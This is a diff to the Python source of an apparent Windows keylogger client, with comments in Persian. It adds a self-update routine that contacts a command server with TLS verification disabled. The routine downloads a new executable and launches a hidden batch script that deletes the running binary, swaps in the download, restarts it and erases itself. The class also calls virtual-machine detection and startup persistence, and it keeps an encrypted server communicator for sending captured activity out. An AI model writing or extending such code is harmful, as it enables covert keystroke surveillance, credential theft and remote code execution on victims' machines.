@@ -5,7 +5,7 @@ import logging
 import sys
 import platform
 import subprocess
-import ctypes
+import requests
 import winreg
 from datetime import datetime
 from keyboard import hook, add_hotkey
@@ -37,25 +37,118 @@ else:
 
 class KeyloggerCore:
     def __init__(self):
-        # Check admin privileges only in non-debug mode
-        if not Config.DEBUG_MODE and not ctypes.windll.shell32.IsUserAnAdmin():
-            if Config.DEBUG_MODE:  # This won't run, but kept for consistency
-                logging.error("This program requires administrative privileges.")
-            sys.exit(1)
-        elif Config.DEBUG_MODE and not ctypes.windll.shell32.IsUserAnAdmin():
-            logging.warning("Running in debug mode without admin privileges. Some commands may fail.")
+        try:
+            if Config.DEBUG_MODE:
+                logging.basicConfig(
+                    level=logging.DEBUG,
+                    format="%(asctime)s - %(levelname)s - %(message)s",
+                    handlers=[
+                        logging.FileHandler("keylogger.log", encoding="utf-8"),
+                        logging.StreamHandler(sys.stdout),
+                    ],
+                )
+                logging.debug("KeyloggerCore initialization started")
 
-        self.client_id = Config.get_client_id()
-        if Config.DEBUG_MODE:
-            logging.info(f"Client ID: {self.client_id}")
-        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
-        self.communicator = ServerCommunicator(self.client_id, self.encryption)
-        self.logger = ActivityLogger(Config.BUFFER_LIMIT)
-        self.running = True
+            self.client_id = Config.get_client_id()
+            self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
+            self.communicator = ServerCommunicator(self.client_id, self.encryption)
+            self.logger = ActivityLogger(Config.BUFFER_LIMIT)
+            self.running = True
 
-        self.check_vm_environment()
+            # بررسی نسخه
+            self.check_for_updates()
 
-        self.add_to_startup()
+            # بررسی VM
+            self.check_vm_environment()
+
+            self.add_to_startup()
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Initialization error: {str(e)}")
+            self.emergency_stop()
+
+    def check_for_updates(self):
+        """
+        بررسی نسخه فعلی کلاینت و به‌روزرسانی در صورت وجود نسخه جدید.
+        """
+        try:
+            if Config.DEBUG_MODE:
+                logging.info("Checking for updates...")
+
+            # دریافت اطلاعات نسخه از سرور
+            response = requests.get(f"{Config.SERVER_URL}/version.php", timeout=Config.COMMAND_TIMEOUT, verify=False)
+            if response.status_code != 200:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Failed to fetch version info: status={response.status_code}")
+                return
+
+            version_info = response.json()
+            server_version = version_info.get('current_version', '0.0')
+            download_url = version_info.get('download_url', '')
+
+            if Config.DEBUG_MODE:
+                logging.info(f"Current version: {Config.CLIENT_VERSION}, Server version: {server_version}")
+
+            # مقایسه نسخه‌ها
+            if version.parse(server_version) > version.parse(Config.CLIENT_VERSION):
+                if Config.DEBUG_MODE:
+                    logging.info(f"New version {server_version} available. Downloading from {download_url}")
+                self.update_client(download_url, server_version)
+            else:
+                if Config.DEBUG_MODE:
+                    logging.info("Client is up-to-date.")
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Update check error: {str(e)}")
+
+    def update_client(self, download_url, new_version):
+        """
+        دانلود و جایگزینی فایل اجرایی با نسخه جدید.
+        """
+        try:
+            # دانلود فایل جدید
+            response = requests.get(download_url, timeout=Config.COMMAND_TIMEOUT, verify=False)
+            if response.status_code != 200:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Failed to download update: status={response.status_code}")
+                return
+
+            # ذخیره فایل جدید
+            new_exe_path = f"version_{new_version.replace('.', '_')}.exe"
+            with open(new_exe_path, 'wb') as f:
+                f.write(response.content)
+            if Config.DEBUG_MODE:
+                logging.info(f"Downloaded new version to {new_exe_path}")
+
+            # جایگزینی فایل اجرایی
+            current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
+            batch_file = "update.bat"
+
+            # ایجاد اسکریپت batch برای جایگزینی
+            batch_content = f"""
+            @echo off
+            ping 127.0.0.1 -n 2 > nul
+            del /F /Q "{current_exe}"
+            move /Y "{new_exe_path}" "{current_exe}"
+            start "" "{current_exe}"
+            del /F /Q "%~f0"
+            """
+            with open(batch_file, 'w', encoding='utf-8') as f:
+                f.write(batch_content)
+
+            # اجرای اسکریپت batch
+            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            if Config.DEBUG_MODE:
+                logging.info(f"Created and executed update batch file: {batch_file}")
+
+            # خروج از فرآیند فعلی
+            sys.exit(0)
+
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Update error: {str(e)}")
 
     def check_vm_environment(self):
         """
